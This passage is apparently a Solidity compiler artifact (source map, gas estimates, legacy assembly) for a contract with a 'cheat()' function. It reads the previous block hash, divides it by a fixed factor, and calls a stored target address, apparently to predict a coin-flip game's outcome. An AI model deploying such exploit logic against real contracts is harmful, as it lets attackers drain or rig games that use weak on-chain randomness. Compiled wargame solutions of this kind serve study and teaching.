							"sourceMap": "83:522:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;311:292;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;;344:4;360:18;414:1;399:12;:16;;;;:::i;:::-;389:27;381:36;;360:57;;427:16;459:6;;446:10;:19;;;;:::i;:::-;427:38;;476:9;500:1;488:8;:13;:28;;511:5;488:28;;;504:4;488:28;476:40;;527:11;550:15;;;;;;;;;;;527:39;;583:2;:7;;;591:4;583:13;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;576:20;;;;;;311:292;:::o;7:137:2:-;;92:6;86:13;77:22;;108:30;132:5;108:30;:::i;:::-;67:77;;;;:::o;150:278::-;;266:2;254:9;245:7;241:23;237:32;234:2;;;282:1;279;272:12;234:2;325:1;350:61;403:7;394:6;383:9;379:22;350:61;:::i;:::-;340:71;;296:125;224:204;;;;:::o;434:109::-;515:21;530:5;515:21;:::i;:::-;510:3;503:34;493:50;;:::o;549:210::-;;674:2;663:9;659:18;651:26;;687:65;749:1;738:9;734:17;725:6;687:65;:::i;:::-;641:118;;;;:::o;765:185::-;;822:20;840:1;822:20;:::i;:::-;817:25;;856:20;874:1;856:20;:::i;:::-;851:25;;895:1;885:2;;900:18;;:::i;:::-;885:2;942:1;939;935:9;930:14;;807:143;;;;:::o;956:191::-;;1016:20;1034:1;1016:20;:::i;:::-;1011:25;;1050:20;1068:1;1050:20;:::i;:::-;1045:25;;1089:1;1086;1083:8;1080:2;;;1094:18;;:::i;:::-;1080:2;1139:1;1136;1132:9;1124:17;;1001:146;;;;:::o;1153:90::-;;1230:5;1223:13;1216:21;1205:32;;1195:48;;;:::o;1249:77::-;;1315:5;1304:16;;1294:32;;;:::o;1332:180::-;1380:77;1377:1;1370:88;1477:4;1474:1;1467:15;1501:4;1498:1;1491:15;1518:180;1566:77;1563:1;1556:88;1663:4;1660:1;1653:15;1687:4;1684:1;1677:15;1704:116;1774:21;1789:5;1774:21;:::i;:::-;1767:5;1764:32;1754:2;;1810:1;1807;1800:12;1754:2;1744:76;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "144800",
								"executionCost": "41063",
								"totalCost": "185863"
							},
							"external": {
								"cheat()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 83,
									"end": 605,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 83,
									"end": 605,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 83,
									"end": 605,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 153,
									"end": 230,
									"name": "PUSH",
									"source": 1,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 136,
									"end": 230,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 136,
									"end": 230,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 262,
									"end": 304,
									"name": "PUSH",
									"source": 1,
									"value": "33C7AF9D0E10FB4D230D317376C87CAB80C276EC"
								},
								{
									"begin": 236,
									"end": 304,
									"name": "PUSH",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 236,
									"end": 304,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 236,
									"end": 304,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 236,
									"end": 304,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 236,
									"end": 304,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 236,
									"end": 304,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 236,
									"end": 304,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 114,
									"end": 130,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 114,
									"end": 130,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 114,
									"end": 130,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 114,
									"end": 130,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 114,
									"end": 130,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 114,
									"end": 130,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 114,
									"end": 130,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 114,
									"end": 130,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 114,
									"end": 130,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 114,
									"end": 130,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 114,
									"end": 130,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 83,
									"end": 605,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 83,
									"end": 605,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 83,
									"end": 605,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 83,
									"end": 605,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 83,
									"end": 605,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 83,
									"end": 605,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 83,
									"end": 605,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220485b08a8942e4502a62214723952777fffeab66b4d9e3bda8901994ed7182fd564736f6c63430008000033",
									".code": [
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH",
											"source": 1,
											"value": "AA1B510E"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 83,
											"end": 605,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 83,
											"end": 605,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 311,
											"end": 603,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 344,
											"end": 348,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 360,
											"end": 378,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 414,
											"end": 415,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 399,
											"end": 411,
											"name": "NUMBER",
											"source": 1
										},
										{
											"begin": 399,
											"end": 415,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 399,
											"end": 415,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 399,
											"end": 415,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 399,
											"end": 415,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 399,
											"end": 415,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 399,
											"end": 415,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 399,
											"end": 415,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 389,
											"end": 416,
											"name": "BLOCKHASH",
											"source": 1
										},
										{
											"begin": 381,
											"end": 417,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 381,
											"end": 417,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 360,
											"end": 417,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 360,
											"end": 417,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 427,
											"end": 443,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 459,
											"end": 465,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 459,
											"end": 465,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 446,
											"end": 456,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 446,
											"end": 465,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 446,
											"end": 465,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 446,
											"end": 465,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 446,
											"end": 465,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 446,
											"end": 465,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 446,
											"end": 465,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 446,
											"end": 465,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 427,
											"end": 465,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 427,
											"end": 465,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 476,
											"end": 485,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 500,
											"end": 501,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 488,
											"end": 496,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 488,
											"end": 501,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 488,
											"end": 516,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 488,
											"end": 516,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 511,
											"end": 516,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 488,
											"end": 516,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 488,
											"end": 516,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 488,
											"end": 516,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 488,
											"end": 516,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 504,
											"end": 508,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 488,
											"end": 516,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 488,
											"end": 516,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 476,
											"end": 516,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 476,
											"end": 516,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 527,
											"end": 538,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 550,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 550,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 550,
											"end": 565,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 550,
											"end": 565,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 550,
											"end": 565,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 550,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 550,
											"end": 565,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 550,
											"end": 565,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 550,
											"end": 565,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 550,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 550,
											"end": 565,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 527,
											"end": 566,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 527,
											"end": 566,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 583,
											"end": 585,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 590,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 583,
											"end": 590,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 583,
											"end": 590,
											"name": "PUSH",
											"source": 1,
											"value": "1D263F67"
										},
										{
											"begin": 591,
											"end": 595,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 583,
											"end": 596,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 583,
											"end": 596,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 576,
											"end": 596,
											"name": "SWAP5",
											"source": 1
										},
										{
											"begin": 576,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 576,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 576,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 576,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 576,
											"end": 596,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 311,
											"end": 603,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 144,
											"name": "tag",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 7,
											"end": 144,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 7,
											"end": 144,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 92,
											"end": 98,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 86,
											"end": 99,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 77,
											"end": 99,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 77,
											"end": 99,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 108,
											"end": 138,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 132,
											"end": 137,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 108,
											"end": 138,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "tag",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 150,
											"end": 428,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 150,
											"end": 428,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 150,
											"end": 428,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 266,
											"end": 268,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 254,
											"end": 263,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 245,
											"end": 252,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 241,
											"end": 264,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 237,
											"end": 269,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 234,
											"end": 236,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 234,
											"end": 236,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 234,
											"end": 236,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 282,
											"end": 283,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 279,
											"end": 280,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 272,
											"end": 284,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 234,
											"end": 236,
											"name": "tag",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 234,
											"end": 236,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 325,
											"end": 326,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 403,
											"end": 410,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 394,
											"end": 400,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 383,
											"end": 392,
											"name": "DUP6",
											"source": 2
										},
										{
